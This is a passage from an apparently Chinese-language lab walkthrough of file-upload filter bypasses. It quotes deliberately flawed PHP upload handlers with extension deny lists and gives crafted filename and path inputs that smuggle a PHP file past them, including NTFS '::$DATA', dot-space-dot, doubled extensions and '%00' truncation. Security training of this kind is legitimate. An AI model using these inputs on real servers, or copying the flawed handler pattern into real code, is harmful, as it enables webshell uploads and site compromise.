class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>加上了首尾去空，但是却少了尾部去点。</p><blockquote><p>Win下xx.jpg[空格] 或xx.jpg.这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点<br>此处会删除末尾的点，但是没有去掉末尾的点，因此上传一个 <code>.php.</code> 文件即可</p></blockquote><p>绕过方法</p><p>用<code>burp</code>将上传文件后缀改为<code>.php.</code>即可。</p><h1 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里还是利用windows的一个特性：</p><blockquote><p>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。</p></blockquote><p>简单讲就是在<code>php</code>+<code>windows</code>的情况下：如果<code>文件名</code>+<code>::$DATA</code>会把<code>::$DATA</code>之后的数据当成文件流处理，不会检测后缀名。且保持<code>::$DATA</code>之前的文件名。</p><p><strong>注：仅windows适用</strong></p><p>绕过方法</p><p>用burp将上传文件后缀改为: <code>xx.php::$DATA</code>即可</p><h1 id="点空格点绕过"><a href="#点空格点绕过" class="headerlink" title="点空格点绕过"></a>点空格点绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的代码逻辑是先删除文件名末尾的点，再进行首尾去空。都只进行一次。故可以构造点空格点进行绕过，也就是后缀名改为<code>xx.php. .</code>，也是利用了Windows的特性。将后缀名改为<code>xx.php. .</code>即可。</p><p>如果目标服务器是windows系统的话，均可用点空格点绕过。</p><h1 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h1><p>这是个比较经典的绕过方式了，分析代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>没有去除文件尾点、空格、::$DATA的操作，猜测是针对非Windows系统的。这里存在的问题是，利用<code>str_ireplace</code>对黑名单里的文件后缀名进行了替换，换成空字符，使用了<code>str_ireplace</code>函数，即不区分大小写，故大小写绕过不适用。但是这里替换是替换成了空字符，于是我们可以双写后缀名，如<code>.pphphp</code>,使得替换后的后缀名为<code>php</code>。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss">定义和用法<br><span class="hljs-built_in">str_ireplace</span>()函数替换字符串中的一些字符（不区分大小写）。<br>该函数必须遵循下列规则：<br>如果搜索的字符串是一个数组，那么它将返回一个数组。<br>如果搜索的字符串是一个数组，那么它将对数组中的每个元素进行查找和替换。<br>如果同时需要对某个数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余的元素将用空字符串进行替换。<br>如果是对一个数组进行查找，但只对一个字符串进行替换，那么替代字符串将对所有查找到的值起作用。<br>注释：该函数是不区分大小写的。使用<span class="hljs-built_in">str_replace</span>()函数执行区分大小写的搜索。<br>注释：该函数是二进制安全的。<br></code></pre></td></tr></table></figure><p>用burp修改后缀名为 <code>.pphphp</code> 即可绕过。</p><h1 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用了白名单，只允许上传 <code>jpg</code>，<code>png</code>，<code>gif</code>三种格式文件。但是在进行<code>move_uploaded_file</code>前。利用<code>$_GET[&#39;save_path&#39;]</code>和随机时间函数进行拼接，拼接成文件存储路径。这里构造文件存储路径利用了<code>GET</code>传入(<code>POST</code>传入也是一样的道理)，导致服务器最终存储的文件名可控，故可以利用这个点进行绕过。 这里利用的是00截断。即<code>move_uploaded_file</code>函数的底层实现类似于C语言，遇到0x00会截断。</p><blockquote><p>截断条件：<br>1、<code>php </code>版本小于5.3.4<br>2、<code>php.ini</code> 的 <code>magic_quotes_gpc</code> 为OFF状态</p></blockquote><p>构造 <code>save_path=/upload/1.php%00</code> 绕过</p><h1 id="图片马-unpack"><a href="#图片马-unpack" class="headerlink" title="图片马 unpack"></a>图片马 unpack</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 